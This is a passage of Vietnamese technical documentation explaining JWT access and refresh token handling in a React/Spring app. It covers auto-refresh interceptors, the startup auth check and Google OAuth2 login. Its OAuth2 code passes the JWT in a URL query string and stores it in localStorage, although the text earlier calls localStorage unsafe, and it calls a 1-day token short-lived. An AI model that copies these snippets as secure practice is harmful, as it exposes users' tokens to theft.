        // Khi Request 1 refresh xong, processQueue() sẽ resolve
        // → Request 2, 3 nhận được token mới
        return retryWithNewToken(token);
    });
}
```

---

#### **5.2.4. Luồng Hoạt Động Chi Tiết**

```
┌─────────────────────────────────────────────────────────┐
│  REQUEST BỊ 401                                         │
│  GET /api/news/my-news → 401 Unauthorized              │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  INTERCEPTOR PHÁT HIỆN                                  │
│  - error.response.status === 401?                      │
│  - originalRequest._retry === false?                   │
│  → CÓ, bắt đầu xử lý                                    │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  KIỂM TRA: Đang refresh?                                │
│  - isRefreshing === true?                              │
│    → CÓ: Đưa vào queue, chờ                            │
│    → KHÔNG: Tiếp tục                                    │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  BẮT ĐẦU REFRESH                                        │
│  - originalRequest._retry = true                       │
│  - isRefreshing = true                                 │
│  - Gọi POST /api/auth/refresh                          │
│    (Cookie HttpOnly tự động gửi kèm)                   │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  REFRESH THÀNH CÔNG                                     │
│  - Nhận accessToken mới từ response                    │
│  - setAccessToken(newToken) → CẬP NHẬT MEMORY          │
│  - processQueue(null, newToken) → Giải quyết queue     │
│  - isRefreshing = false                                │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  RETRY REQUEST GỐC                                      │
│  - originalRequest.headers.Authorization =              │
│    'Bearer ' + newToken                                │
│  - return api(originalRequest)                         │
│  → Request được gửi lại với token mới                  │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  THÀNH CÔNG                                             │
│  - Response 200 OK                                     │
│  - Component nhận được data                            │
│  - User không biết đã refresh token                    │
└─────────────────────────────────────────────────────────┘
```

---

#### **5.2.5. Xử Lý Refresh Thất Bại**

**Khi nào refresh thất bại?**
- Refresh Token hết hạn (quá 7-30 ngày)
- Refresh Token bị revoked (user logout, admin revoke)
- Refresh Token không hợp lệ

**Hành động khi thất bại:**

```javascript
catch (_error) {
    // 1. Reset flag
    isRefreshing = false;
    
    // 2. Báo lỗi cho tất cả request trong queue
    processQueue(_error, null);
    
    // 3. XÓA TOKEN KHỎI MEMORY
    setAccessToken(null);
    
    // 4. Gửi event để AuthContext logout
    window.dispatchEvent(new Event("auth-failed"));
    
    // 5. Reject error
    return Promise.reject(_error);
}
```

**AuthContext lắng nghe event:**

```javascript
// AuthContext.js
useEffect(() => {
    const handleAuthFailure = () => {
        setUser(null);
        setIsAuthenticated(false);
        setLoading(false);
        window.location.href = '/login';  // Redirect về login
    };
    
    window.addEventListener("auth-failed", handleAuthFailure);
    
    return () => {
        window.removeEventListener("auth-failed", handleAuthFailure);
    };
}, []);
```

---

#### **5.2.6. Tóm Tắt: Auto Refresh**

**Ưu điểm:**
- ✅ **Seamless:** User không cảm nhận được việc refresh
- ✅ **Tự động:** Không cần code thủ công ở mỗi component
- ✅ **Hiệu quả:** Chỉ 1 request refresh cho nhiều request bị 401
- ✅ **An toàn:** Xử lý đúng khi refresh thất bại

**Lưu ý:**
- ⚠️ Refresh Token phải còn hợp lệ (chưa hết hạn)
- ⚠️ Cookie HttpOnly phải được gửi kèm (`withCredentials: true`)
- ⚠️ Queue tránh nhiều request refresh cùng lúc

---

### **5.3. Check Auth Status khi App Start**

#### **5.3.1. Tại Sao Cần Check Auth Status?**

**Vấn đề:**
- Khi user refresh trang, `inMemoryAccessToken` bị reset về `null`
- App không biết user đã đăng nhập hay chưa
- Cần kiểm tra xem Refresh Token còn hợp lệ không

**Giải pháp:**
- Khi app khởi động, gọi `/refresh` để lấy Access Token mới
- Nếu thành công → User đã đăng nhập → Lưu token vào memory
- Nếu thất bại → User chưa đăng nhập → Không làm gì

---

#### **5.3.2. Code Chi Tiết**

```javascript
// AuthContext.js
export const AuthProvider = ({ children }) => {
    const [user, setUser] = useState(null);
    const [loading, setLoading] = useState(true);
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    
    // Chạy khi component mount (app khởi động)
    useEffect(() => {
        checkAuthStatus();
        
        // Lắng nghe event "auth-failed" từ interceptor
        const handleAuthFailure = () => {
            setUser(null);
            setIsAuthenticated(false);
            setLoading(false);
            window.location.href = '/login';
        };
        
        window.addEventListener("auth-failed", handleAuthFailure);
        
        return () => {
            window.removeEventListener("auth-failed", handleAuthFailure);
        };
    }, []);
    
    const checkAuthStatus = async () => {
        try {
            setLoading(true);
            
            // 1. Gọi /refresh để lấy Access Token mới
            // (Cookie HttpOnly tự động gửi kèm)
            const response = await newsAPI.refreshToken();
            const { accessToken } = response.data;
            
            // 2. LƯU TOKEN VÀO MEMORY
            setAccessToken(accessToken);
            
            // 3. Lấy thông tin user hiện tại
            await refreshUser();
            
        } catch (error) {
            // Refresh thất bại → User chưa đăng nhập
            // (Không có Refresh Token hoặc đã hết hạn)
            setUser(null);
            setIsAuthenticated(false);
        } finally {
            setLoading(false);
        }
    };
    
    const refreshUser = async () => {
        try {
            // Gọi API để lấy thông tin user
            const response = await newsAPI.getCurrentUser();
            const userData = response.data;
            
            // Kiểm tra user có bị khóa không
            if (userData.status !== 'ACTIVE') {
                await logout();
                return false;
            }
            
            // Set user state
            setUser(userData);
            setIsAuthenticated(true);
            return true;
            
        } catch (e) {
            setUser(null);
            setIsAuthenticated(false);
            return false;
        }
    };
};
```

---

#### **5.3.3. Luồng Hoạt Động**

```
┌─────────────────────────────────────────────────────────┐
│  1. APP KHỞI ĐỘNG                                       │
│     - User mở trang web                                 │
│     - React app render                                  │
│     - AuthProvider mount                                │
│     - useEffect() chạy → checkAuthStatus()             │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  2. INMEMORY TOKEN = NULL                               │
│     - Khi refresh trang, JavaScript reload              │
│     - api.js được import lại                            │
│     - inMemoryAccessToken = null (reset)                │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  3. GỌI /REFRESH                                        │
│     - newsAPI.refreshToken()                            │
│     - Cookie HttpOnly tự động gửi kèm                   │
│     - Backend kiểm tra Refresh Token                    │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  4A. REFRESH THÀNH CÔNG                                 │
│     - Backend trả về Access Token mới                   │
│     - setAccessToken(token) → LƯU VÀO MEMORY           │
│     - refreshUser() → Lấy thông tin user                │
│     - setUser(userData)                                 │
│     - setIsAuthenticated(true)                          │
│     - setLoading(false)                                 │
│     → User đã đăng nhập, app sẵn sàng                  │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  4B. REFRESH THẤT BẠI                                   │
│     - Refresh Token không tồn tại/hết hạn               │
│     - Backend trả về 401                                │
│     - catch error                                       │
│     - setUser(null)                                     │
│     - setIsAuthenticated(false)                         │
│     - setLoading(false)                                 │
│     → User chưa đăng nhập, hiển thị login page         │
└─────────────────────────────────────────────────────────┘
```

---

#### **5.3.4. Tại Sao Không Dùng localStorage để Check?**

**Cách cũ (không an toàn):**
```javascript
// ❌ KHÔNG NÊN
useEffect(() => {
    const token = localStorage.getItem('token');
    if (token) {
        // Token có thể đã hết hạn!
        // Phải check token có hợp lệ không → phức tạp
        setAccessToken(token);
    }
}, []);
```

**Vấn đề:**
- Token trong localStorage có thể đã hết hạn
- Phải validate token → phức tạp
- Không an toàn (XSS có thể đọc)

**Cách mới (an toàn):**
```javascript
// ✅ NÊN DÙNG
useEffect(() => {
    // Luôn gọi /refresh để lấy token MỚI
    // Nếu Refresh Token còn hợp lệ → có token mới
    // Nếu Refresh Token hết hạn → không có token
    checkAuthStatus();
}, []);
```

**Ưu điểm:**
- Luôn có token mới (chưa hết hạn)
- Đơn giản: chỉ cần gọi `/refresh`
- An toàn: không lưu token trong localStorage

---

#### **5.3.5. Loading State**

**Tại sao cần loading state?**

```javascript
const [loading, setLoading] = useState(true);

// Khi app khởi động
useEffect(() => {
    checkAuthStatus();  // Mất thời gian (gọi API)
}, []);

// Trong khi checkAuthStatus đang chạy:
// - loading = true
// - Không biết user đã đăng nhập hay chưa
// - Không nên render ProtectedRoute

// Sau khi checkAuthStatus xong:
// - loading = false
// - Biết rõ user đã đăng nhập hay chưa
// - Có thể render đúng route
```

**Sử dụng trong ProtectedRoute:**

```javascript
// ProtectedRoute.js
const ProtectedRoute = ({ children }) => {
    const { isAuthenticated, loading } = useAuth();
    
    if (loading) {
        return <div>Loading...</div>;  // Chờ checkAuthStatus
    }
    
    if (!isAuthenticated) {
        return <Navigate to="/login" />;
    }
    
    return children;
};
```

---

#### **5.3.6. Tóm Tắt: Check Auth Status**

**Mục đích:**
- Kiểm tra user đã đăng nhập hay chưa khi app khởi động
- Lấy Access Token mới từ Refresh Token
- Lưu token vào memory để dùng cho các request sau

**Luồng:**
1. App khởi động → `checkAuthStatus()`
2. Gọi `/refresh` (cookie tự động gửi kèm)
3. Nếu thành công → Lưu token vào memory → Lấy user info
4. Nếu thất bại → User chưa đăng nhập

**Lưu ý:**
- ⚠️ Phải có `loading` state để tránh render sai route
- ⚠️ Refresh Token phải còn hợp lệ (chưa hết hạn)
- ⚠️ Cookie HttpOnly phải được gửi kèm (`withCredentials: true`)

---

## 🔐 **PHẦN 6: OAUTH2 GOOGLE LOGIN**

### **6.1. Luồng OAuth2**

```
1. User click "Đăng nhập với Google"
   ↓
2. Redirect đến Google OAuth
   ↓
3. User xác nhận
   ↓
4. Google redirect về: /oauth2/callback?code=xxx
   ↓
5. Backend exchange code → Access Token
   ↓
6. Backend lấy thông tin user từ Google
   ↓
7. Tạo/lấy user trong database
   ↓
8. Tạo JWT token
   ↓
9. Redirect về frontend với token
   ↓
10. Frontend lưu token và đăng nhập
```

---

### **6.2. OAuth2LoginSuccessHandler**

```java
@Component
public class OAuth2LoginSuccessHandler implements AuthenticationSuccessHandler {
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public void onAuthenticationSuccess(...) {
        // 1. Lấy thông tin từ Google
        OAuth2User oAuth2User = (OAuth2User) authentication.getPrincipal();
        String email = (String) oAuth2User.getAttributes().get("email");
        String name = (String) oAuth2User.getAttributes().get("name");
        String picture = (String) oAuth2User.getAttributes().get("picture");
        
        // 2. Tìm user trong database
        Optional<User> existing = userRepository.findByEmail(email);
        User user;
        
        if (existing.isPresent()) {
            user = existing.get();
        } else {
            // Tạo user mới
            user = new User();
            user.setEmail(email);
            user.setFullName(name);
            user.setUsername(email);
            user.setPassword("");  // OAuth2 không có password
            user.setStatus(User.UserStatus.ACTIVE);
            user.setRole(User.UserRole.USER);
            user.setAvatarUrl(picture);
            user = userRepository.save(user);
        }
        
        // 3. Tạo JWT token
        String jwtToken = jwtUtil.generateTokenFromUsername(user.getUsername());
        
        // 4. Redirect về frontend với token
        String redirectUrl = frontendUrl + "/oauth2/callback?token=" + 
            URLEncoder.encode(jwtToken, StandardCharsets.UTF_8);
        response.sendRedirect(redirectUrl);
    }
}
```

---

### **6.3. Frontend OAuth2 Callback**

```javascript
// OAuth2Callback.js
const handleOAuth2Callback = async () => {
    // 1. Lấy token từ URL
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('token');
    
    if (token) {
        // 2. Lưu token
        localStorage.setItem('token', token);
        setAccessToken(token);  // Lưu vào memory
        
        // 3. Lấy thông tin user
        const me = await newsAPI.getCurrentUser();
        
        // 4. Set user state
        await oauth2Login(token, me.data);
        
        // 5. Redirect
        if (me.data.role === 'ADMIN') {
            navigate('/admin');
        } else {
            navigate('/');
        }
    }
};
```

---

## 📊 **PHẦN 7: TỔNG HỢP LUỒNG HOẠT ĐỘNG**

### **7.1. Đăng nhập và Sử dụng**

```
1. Login → Nhận Access Token + Refresh Token (cookie)
2. Lưu Access Token vào memory
3. Gửi request với header: Authorization: Bearer {token}
4. JwtAuthenticationFilter validate token
5. Set Authentication vào SecurityContext
6. Controller xử lý request
```

### **7.2. Token Refresh**

```
1. Access Token hết hạn → 401
2. Interceptor phát hiện → Gọi /refresh
3. Backend:
   - Revoke Refresh Token cũ
   - Tạo Refresh Token mới (cùng family)
   - Tạo Access Token mới
4. Response: Access Token mới + Refresh Token mới (cookie)
5. Frontend lưu token mới
6. Retry request gốc với token mới
```

### **7.3. Đăng xuất**

```
1. User click logout
2. Frontend gọi POST /api/auth/logout
3. Backend:
   - Revoke Refresh Token
   - Clear cookie
4. Frontend xóa Access Token (memory)
5. Redirect về login
```

---

## 🔒 **BẢO MẬT**

### **1. HttpOnly Cookie**
- ✅ JavaScript không thể đọc Refresh Token
- ✅ Chống XSS attack

### **2. Token Rotation**
- ✅ Mỗi lần refresh tạo token mới
- ✅ Token cũ bị revoked
- ✅ Giảm thiểu thiệt hại nếu bị đánh cắp

### **3. Token Family**
- ✅ Phát hiện token reuse
- ✅ Revoke cả family nếu phát hiện reuse

### **4. Short-lived Access Token**
- ✅ Token hết hạn nhanh (1 ngày)
- ✅ Dễ revoke

### **5. Hashed Refresh Token**
- ✅ Lưu hash trong database (SHA-256)
- ✅ Không lưu raw token

---

## 📝 **TÓM TẮT**

### **Access Token (JWT):**
- Ngắn hạn (1 ngày)
- Lưu trong memory
- Gửi kèm mỗi request

### **Refresh Token:**
- Dài hạn (7-30 ngày)
- HttpOnly cookie
- Dùng để lấy Access Token mới

### **Token Rotation:**
- Mỗi lần refresh tạo token mới
- Token cũ bị revoked

### **Token Family:**
- Chống token reuse attack
- Phát hiện và revoke cả family

### **Automatic Refresh:**
- Frontend tự động refresh khi 401
- Request queue để tránh nhiều request refresh

---

**Hệ thống xác thực và phân quyền này rất an toàn và hiện đại! 🚀**




